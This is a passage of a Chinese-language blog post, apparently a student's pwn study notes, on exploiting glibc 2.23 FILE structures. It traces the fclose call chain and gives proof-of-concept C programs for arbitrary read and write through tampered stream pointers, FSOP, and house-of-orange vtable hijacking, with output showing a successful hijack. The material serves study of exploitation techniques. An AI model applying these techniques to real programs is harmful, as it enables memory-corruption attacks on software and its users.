_IO_write_ptr = <span class="number">0x405038</span> &lt;error: Cannot access memory at address <span class="number">0x405038</span>&gt;,</span><br><span class="line">  _IO_write_end = <span class="number">0x0</span>,</span><br><span class="line">  _IO_buf_base = <span class="number">0x0</span>,</span><br><span class="line">  _IO_buf_end = <span class="number">0x0</span>,</span><br><span class="line">  _IO_save_base = <span class="number">0x0</span>,</span><br><span class="line">  _IO_backup_base = <span class="number">0x0</span>,</span><br><span class="line">  _IO_save_end = <span class="number">0x0</span>,</span><br><span class="line">  _markers = <span class="number">0x0</span>,</span><br><span class="line">  _chain = <span class="number">0x0</span>,</span><br><span class="line">  _fileno = <span class="number">1</span>,</span><br><span class="line">  _flags2 = <span class="number">0</span>,</span><br><span class="line">  _old_offset = <span class="number">0</span>,</span><br><span class="line">  _cur_column = <span class="number">0</span>,</span><br><span class="line">  _vtable_offset = <span class="number">0</span> <span class="string">&#x27;\000&#x27;</span>,</span><br><span class="line">  _shortbuf = <span class="string">&quot;&quot;</span>,</span><br><span class="line">  _lock = <span class="number">0x1458790</span>,</span><br><span class="line">  _offset = <span class="number">-1</span>,</span><br><span class="line">  _codecvt = <span class="number">0x0</span>,</span><br><span class="line">  _wide_data = <span class="number">0x14587a0</span>,</span><br><span class="line">  _freeres_list = <span class="number">0x0</span>,</span><br><span class="line">  _freeres_buf = <span class="number">0x0</span>,</span><br><span class="line">  __pad5 = <span class="number">0</span>,</span><br><span class="line">  _mode = <span class="number">-1</span>,</span><br><span class="line">  _unused2 = <span class="string">&#x27;\000&#x27;</span> &lt;repeats <span class="number">19</span> times&gt;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="fclose">fclose</h3>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">flose(_IO_new_fclose@glibc-2.23/libio/iofclose.c:38)</span><br><span class="line">	-&gt;_IO_un_link@glibc-2.23/libio/genops.c:58</span><br><span class="line">		//从_IO_list_all为首的单向链表上遍历找到并拆下这个_IO_FILE_plus,</span><br><span class="line">	-&gt;_IO_file_close_it@glibc-2.23/libio/fileops.c:157</span><br><span class="line">		-&gt;_IO_do_flush			//缓冲区还有东西没打印出来,都给打出来</span><br><span class="line">			-&gt;_IO_do_write</span><br><span class="line">				-&gt;new_do_write</span><br><span class="line">					-&gt;vtable.__write</span><br><span class="line">						-&gt;write(linux api)</span><br><span class="line">						</span><br><span class="line">		-&gt;_IO_un_link	//这一次重复调用好像是多余的,可能防止之前有什么差错?</span><br><span class="line">	-&gt;vtable.__finish(_IO_new_file_finish)</span><br><span class="line">		-&gt;_IO_do_flush	//第二次调用</span><br><span class="line">			...</span><br><span class="line">		-&gt;__close</span><br><span class="line">			-&gt;_IO_file_close_it	//第二次调用</span><br><span class="line">		-&gt;_IO_default_finish</span><br><span class="line">			-&gt;free	//释放对上占用的内存</span><br><span class="line">			-&gt;_IO_un_link	//第三次调用</span><br></pre></td></tr></table></figure>
<h2 id="exploit">exploit</h2>
<h3 id="泄露">泄露</h3>
<p>篡改fp的写缓冲区指针指向需要泄露的地址,
并篡改fp的文件描述符为标准输出, 触发一个缓冲区刷新, 即可打印泄露</p>
<blockquote>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">size_t</span> <span class="title function_">fwrite</span><span class="params">(<span class="type">const</span> <span class="type">void</span> *ptr, <span class="type">size_t</span> size, <span class="type">size_t</span> nmemb, FILE *stream)</span></span><br></pre></td></tr></table></figure>
<p>把 <strong>ptr</strong> 所指向的数组中的数据写入到给定流
<strong>stream</strong> 中。</p>
<p>写入<code>size</code>大小的单位<code>nmemb</code>个</p>
</blockquote>
<p>写一个<code>poc</code>意思意思</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="type">char</span> secret[]=<span class="string">&quot;this is a secret&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;flag @ %p\n&quot;</span>,secret);</span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> buffer[<span class="number">0x100</span>];</span><br><span class="line">    FILE *fp;</span><br><span class="line">    fp = fopen(<span class="string">&quot;./flag&quot;</span>, <span class="string">&quot;w&quot;</span>);		<span class="comment">// unset _IO_NO_WRITES to bypass checks in _IO_file_overflow</span></span><br><span class="line">    fp-&gt;_flags = <span class="number">0x800</span>; 			<span class="comment">//IO_CURRENTLY_PUTTING bypass checks in _IO_file_overflow</span></span><br><span class="line">    fp-&gt;_IO_write_base = secret;	<span class="comment">//points to address that we want to leak</span></span><br><span class="line">    fp-&gt;_IO_read_end = secret;      <span class="comment">//IO_read_end must equals to write_base to bypass checks in new_do_write</span></span><br><span class="line">    fp-&gt;_IO_write_ptr = secret + <span class="keyword">sizeof</span>(secret);	<span class="comment">//ptr - base contains our flag to leak</span></span><br><span class="line">    fp-&gt;_fileno = <span class="number">1</span>;               	<span class="comment">//redirect to stdout</span></span><br><span class="line"></span><br><span class="line">    fwrite(buffer,<span class="number">0x100</span>,<span class="number">0x1</span>,fp);    </span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>假设我们能够控制<code>fp</code>指向的<code>FILE</code>结构,并能改写其成员</p>
<p>我们希望通过设置<code>fp-&gt;_IO_write_base = secret;</code>触发调用链</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">fwrite</span><br><span class="line">	_IO_sputn =&gt; _IO_file_xsputn</span><br><span class="line">		_IO_OVERFLOW =&gt; _IO_file_overflow</span><br><span class="line">			=&gt; _IO_new_do_write</span><br><span class="line">				=&gt; new_do_write</span><br><span class="line">					=&gt; _IO_file_write</span><br><span class="line">						=&gt; __write</span><br></pre></td></tr></table></figure>
<p>从而打印<code>secret</code>上的字符串</p>
<p>为了实现这一目的,还需要设置<code>FILE</code>的几个参数</p>
<h4 id="fp-fopen.flag-w">-1.<code>fp = fopen("./flag", "w");</code></h4>
<p>这个<code>fp</code>要么以<code>w</code>打开,要么手动设置其<code>flag |= ~0x8</code></p>
<p>总之不能有<code>_IO_NO_WRITES</code>,
这是因为<code>_IO_file_overflow</code>最开始会检查该标志,
防止对不可写的文件进行写入操作</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">_IO_new_file_overflow (FILE *f, <span class="type">int</span> ch)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (f-&gt;_flags &amp; _IO_NO_WRITES) <span class="comment">/* SET ERROR */</span></span><br><span class="line">    &#123;</span><br><span class="line">      f-&gt;_flags |= _IO_ERR_SEEN;</span><br><span class="line">      __set_errno (EBADF);</span><br><span class="line">      <span class="keyword">return</span> EOF;</span><br><span class="line">    &#125;</span><br><span class="line">    ...</span><br></pre></td></tr></table></figure>
<h4
id="fp-_io_write_base-secret">0.<code>fp-&gt;_IO_write_base = secret;</code></h4>
<p>最关键的一条,要泄露的地址</p>
<h4
id="fp-_io_write_ptr-secret-sizeofsecret">1.<code>fp-&gt;_IO_write_ptr = secret + sizeof(secret);</code></h4>
<p>与0紧密配合,<code>_IO_OVERFLOW</code>会将位于<code>write_base</code>和<code>write_ptr</code>之间的内容刷新到缓冲区</p>
<p>要保证两者之间的距离大于flag长度</p>
<h4 id="fp-_flags-0x800">3.<code>fp-&gt;_flags = 0x800;</code></h4>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fp-&gt;_flags = 0x800; //IO_CURRENTLY_PUTTING</span><br></pre></td></tr></table></figure>
<p>这里是因为在函数<code>_IO_file_overflow</code>中,如果不设置该标志会进入一个条件分支,修改我们预设的<code>_IO_write_base</code>等一系列指针</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//_IO_new_file_overflow</span></span><br><span class="line"><span class="keyword">if</span> ((f-&gt;_flags &amp; _IO_CURRENTLY_PUTTING) == <span class="number">0</span> || f-&gt;_IO_write_base == <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">/* Allocate a buffer if needed. */</span></span><br><span class="line">    <span class="keyword">if</span> (f-&gt;_IO_write_base == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        _IO_doallocbuf(f);</span><br><span class="line">        _IO_setg(f, f-&gt;_IO_buf_base, f-&gt;_IO_buf_base, f-&gt;_IO_buf_base);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/* Otherwise must be currently reading.</span></span><br><span class="line"><span class="comment">   If _IO_read_ptr (and hence also _IO_read_end) is at the buffer end,</span></span><br><span class="line"><span class="comment">   logically slide the buffer forwards one block (by setting the</span></span><br><span class="line"><span class="comment">   read pointers to all point at the beginning of the block).  This</span></span><br><span class="line"><span class="comment">   makes room for subsequent output.</span></span><br><span class="line"><span class="comment">   Otherwise, set the read pointers to _IO_read_end (leaving that</span></span><br><span class="line"><span class="comment">   alone, so it can continue to correspond to the external position). */</span></span><br><span class="line">    <span class="keyword">if</span> (__glibc_unlikely(_IO_in_backup(f)))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">size_t</span> nbackup = f-&gt;_IO_read_end - f-&gt;_IO_read_ptr;</span><br><span class="line">        _IO_free_backup_area(f);</span><br><span class="line">        f-&gt;_IO_read_base -= MIN(nbackup,</span><br><span class="line">                                f-&gt;_IO_read_base - f-&gt;_IO_buf_base);</span><br><span class="line">        f-&gt;_IO_read_ptr = f-&gt;_IO_read_base;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (f-&gt;_IO_read_ptr == f-&gt;_IO_buf_end)</span><br><span class="line">        f-&gt;_IO_read_end = f-&gt;_IO_read_ptr = f-&gt;_IO_buf_base;</span><br><span class="line">    f-&gt;_IO_write_ptr = f-&gt;_IO_read_ptr;</span><br><span class="line">    f-&gt;_IO_write_base = f-&gt;_IO_write_ptr;</span><br><span class="line">    f-&gt;_IO_write_end = f-&gt;_IO_buf_end;</span><br><span class="line">    f-&gt;_IO_read_base = f-&gt;_IO_read_ptr = f-&gt;_IO_read_end;</span><br><span class="line"></span><br><span class="line">    f-&gt;_flags |= _IO_CURRENTLY_PUTTING;</span><br><span class="line">    <span class="keyword">if</span> (f-&gt;_mode &lt;= <span class="number">0</span> &amp;&amp; f-&gt;_flags &amp; (_IO_LINE_BUF | _IO_UNBUFFERED))</span><br><span class="line">        f-&gt;_IO_write_end = f-&gt;_IO_write_ptr;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4
id="fp-_io_read_end-secret">4.<code>fp-&gt;_IO_read_end = secret;</code></h4>
<p>这条是为了绕过<code>new_do_write</code>中的检查,</p>
<p>要么<code>_flags</code>中有<code>_IO_IS_APPENDING(0x1000)</code>标志,</p>
<p>要么<code>fp-&gt;_IO_read_end == fp-&gt;_IO_write_base</code></p>
<p>才能避免<code>_IO_SYSSEEK</code>的调用,因为<code>_IO_SYSSEEK</code>调用后<code>new_pos == _IO_pos_BA</code>,接下来就返回了</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//new_do_write</span></span><br><span class="line"><span class="keyword">if</span> (fp-&gt;_flags &amp; _IO_IS_APPENDING)</span><br><span class="line">    fp-&gt;_offset = _IO_pos_BAD;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (fp-&gt;_IO_read_end != fp-&gt;_IO_write_base)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">off64_t</span> new_pos = _IO_SYSSEEK(fp, fp-&gt;_IO_write_base - fp-&gt;_IO_read_end, <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span> (new_pos == _IO_pos_BAD)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    fp-&gt;_offset = new_pos;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>因此将<code>flags</code>置位<code>_IO_IS_APPENDING</code>也可以</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fp-&gt;_flags = <span class="number">0x800</span> | <span class="number">0x1000</span>;</span><br></pre></td></tr></table></figure>
<h4 id="fsop方法">FSOP方法</h4>
<p>如果没有fwrite调用,也可以考虑利用FSOP方法</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="type">char</span> secret[]=<span class="string">&quot;flag&#123;dustball&#125;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;flag @ %p\n&quot;</span>,secret);</span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> buffer[<span class="number">0x100</span>];</span><br><span class="line">    FILE *fp;</span><br><span class="line">    fp = fopen(<span class="string">&quot;./flag&quot;</span>, <span class="string">&quot;w&quot;</span>);</span><br><span class="line">    fp-&gt;_flags = <span class="number">0x800</span> | <span class="number">0x1000</span>; <span class="comment">//IO_CURRENTLY_PUTTING</span></span><br><span class="line">    fp-&gt;_IO_write_base = secret;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// fp-&gt;_IO_read_end = secret;      //IO_read_end must equals to write_base to overpass check in</span></span><br><span class="line">    fp-&gt;_IO_write_ptr = secret + <span class="keyword">sizeof</span>(secret);</span><br><span class="line">    fp-&gt;_fileno = <span class="number">1</span>;                  <span class="comment">//stdout</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//no fwrite , however fp is linked to _IO_list_all, use FSOP</span></span><br><span class="line">    <span class="comment">// fwrite(buffer,0x100,0x1,fp);     </span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="任意地址写">任意地址写</h3>
<p>写个poc意思意思</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> key = <span class="number">0x12345678</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">  FILE *fp;</span><br><span class="line">  <span class="type">char</span> buffer[<span class="number">100</span>];</span><br><span class="line"></span><br><span class="line">  fp = fopen(<span class="string">&quot;./flag&quot;</span>,<span class="string">&quot;r&quot;</span>);</span><br><span class="line">  <span class="comment">//fp -&gt; _flags不能有IO_NO_READS,也不能有_IO_EOF_SEEN</span></span><br><span class="line">  fp -&gt; _IO_read_ptr = <span class="number">0</span>;</span><br><span class="line">  fp -&gt; _IO_read_end = <span class="number">0</span>;</span><br><span class="line">  fp -&gt; _IO_buf_base = &amp;key;</span><br><span class="line">  fp -&gt; _IO_buf_end = &amp;key + <span class="number">4</span>;</span><br><span class="line">  fp -&gt; _fileno = <span class="number">0</span>;</span><br><span class="line">    </span><br><span class="line">  fread(buffer,<span class="number">1</span>,<span class="number">4</span>,fp);             <span class="comment">//方向fp -&gt; _IO_buf_base</span></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;%p\n&quot;</span>,key);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>假设我们能够控制<code>fp</code>指向的<code>FILE</code>结构,并能改写其成员</p>
<p>我们希望通过设置<code>fp-&gt;_IO_buf_base = target_addr;</code>触发调用链</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">fread</span><br><span class="line">	_IO_sgetn =&gt; _IO_file_xsgetn</span><br><span class="line">		__underflow</span><br><span class="line">			_IO_UNDERFLOW =&gt; _IO_file_underflow</span><br><span class="line">				_IO_SYSREAD =&gt; _IO_file_read</span><br><span class="line">					__read</span><br></pre></td></tr></table></figure>
<p>从而实现往<code>target_addr</code>写入任意数据</p>
<p>为了实现这一目的，还需要设置fp的其他参数</p>
<h4 id="fp-fopen.flagr">-1.<code>fp = fopen("./flag","r");</code></h4>
<p><code>fp</code>必须是有读权限的，或者手动设置<code>flag</code>，不能有<code>IO_NO_READS(0x4)</code>标志</p>
<p>同时不能有<code>_IO_EOF_SEEN(0x10)</code></p>
<p>这是因为<code>_IO_file_underflow</code>会对flag进行检查</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span></span><br><span class="line">_IO_new_file_underflow (FILE *fp)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">ssize_t</span> count;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* C99 requires EOF to be &quot;sticky&quot;.  */</span></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_flags &amp; _IO_EOF_SEEN)</span><br><span class="line">    <span class="keyword">return</span> EOF;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_flags &amp; _IO_NO_READS)</span><br><span class="line">    &#123;</span><br><span class="line">      fp-&gt;_flags |= _IO_ERR_SEEN;</span><br><span class="line">      __set_errno (EBADF);</span><br><span class="line">      <span class="keyword">return</span> EOF;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<h4
id="fp---_io_buf_base-key">0.<code>fp -&gt; _IO_buf_base = &amp;key;</code></h4>
<p>任意地址写的关键</p>
<h4
id="fp---_io_buf_end-key-4">1.<code>fp -&gt; _IO_buf_end = &amp;key + 4;</code></h4>
<p>配合0,必须保证end和base之间的距离要大于fread写入的长度,</p>
<p>这是因为<code>_IO_file_xsgetn</code>中会检查这一点</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span> (want &gt; <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">  have = fp-&gt;_IO_read_end - fp-&gt;_IO_read_ptr;</span><br><span class="line">  <span class="keyword">if</span> (want &lt;= have)</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">memcpy</span>(s, fp-&gt;_IO_read_ptr, want);</span><br><span class="line">    fp-&gt;_IO_read_ptr += want;</span><br><span class="line">    want = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> (have &gt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      s = __mempcpy(s, fp-&gt;_IO_read_ptr, have);</span><br><span class="line">      want -= have;</span><br><span class="line">      fp-&gt;_IO_read_ptr += have;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<h4
id="fp---_io_read_ptr-0-fp---_io_read_end-0">2.<code>fp -&gt; _IO_read_ptr = 0; &amp;&amp; fp -&gt; _IO_read_end = 0;</code></h4>
<p>这是因为在<code>_IO_file_underflow</code>中会检查两者是否相等</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (fp-&gt;_IO_read_ptr &lt; fp-&gt;_IO_read_end)</span><br><span class="line">  <span class="keyword">return</span> *(<span class="type">unsigned</span> <span class="type">char</span> *) fp-&gt;_IO_read_ptr;</span><br></pre></td></tr></table></figure>
<h4 id="fp---_fileno-0">3.<code>fp -&gt; _fileno = 0;</code></h4>
<p>给予我们从标准输入获取任意字符到目标地址的权利</p>
<h3 id="house-of-orange-glibc-2.23">[house of orange @ glibc &lt;=
2.23]</h3>
<p>通过堆利用手段，控制堆上的<code>FILE</code>结构体，能够修改<code>vtable</code>指针，具体怎么堆利用，这不重要</p>
<p>重要的是把<code>vtable</code>指针修改为构造的假表中</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="type">void</span> <span class="title function_">win</span><span class="params">()</span>&#123;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;function win called\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">  FILE *fp;</span><br><span class="line">  <span class="type">size_t</span> *fake_vtable;</span><br><span class="line">  <span class="type">size_t</span> *vtable_ptr;</span><br><span class="line">  <span class="type">size_t</span> *vtable_addr;</span><br><span class="line"></span><br><span class="line">  fake_vtable = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;fake_vtable @ %p\n&quot;</span>, fake_vtable);</span><br><span class="line">  <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">20</span>;i++)&#123; <span class="comment">// 我今天就是要把这假表狠狠塞满</span></span><br><span class="line">    fake_vtable[i] = (<span class="type">size_t</span>)win;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  fp = fopen(<span class="string">&quot;./flag&quot;</span>,<span class="string">&quot;r&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;fp @ %p\n&quot;</span>, fp);    </span><br><span class="line"></span><br><span class="line">  <span class="comment">//_IO_FILE_plus中vtable指针的偏移地址为0xd8</span></span><br><span class="line">  vtable_ptr  = (<span class="type">char</span>*)fp + <span class="number">0xd8</span>;   </span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;vtable_ptr = %p\n&quot;</span>, vtable_ptr);</span><br><span class="line"></span><br><span class="line">  <span class="comment">//曾经的vtable指针</span></span><br><span class="line">  vtable_addr = vtable_ptr[<span class="number">0</span>];</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;original vtable_addr = %p\n&quot;</span>, vtable_addr);</span><br><span class="line"></span><br><span class="line">  <span class="comment">//修改vtable指针指向假虚表</span></span><br><span class="line">  *vtable_ptr = fake_vtable;</span><br><span class="line">  vtable_addr = vtable_ptr[<span class="number">0</span>];</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;new vtable_addr = %p\n&quot;</span>, vtable_addr);</span><br><span class="line"></span><br><span class="line">  fclose(fp);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>在<code>ubuntu16.04 &amp; glibc-2.23</code>上实验,成功劫持了虚表</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">root@Executor:/mnt/c/Users/<span class="number">86135</span>/Desktop/pwncollege/software/file/test<span class="meta"># gcc orange.c -o orange -no-pie -g -no-pie -w</span></span><br><span class="line">root@Executor:/mnt/c/Users/<span class="number">86135</span>/Desktop/pwncollege/software/file/test# ./orange</span><br><span class="line">fake_vtable @ <span class="number">0x1690010</span></span><br><span class="line">fp @ <span class="number">0x1690530</span></span><br><span class="line">vtable_ptr = <span class="number">0x1690608</span></span><br><span class="line">original vtable_addr = <span class="number">0x7fd1b3f3c6e0</span></span><br><span class="line">new vtable_addr = <span class="number">0x1690010</span></span><br><span class="line">function win called</span><br><span class="line">function win called</span><br></pre></td></tr></table></figure>
<p>同样的代码对于更高版本的<code>glibc</code>无效</p>
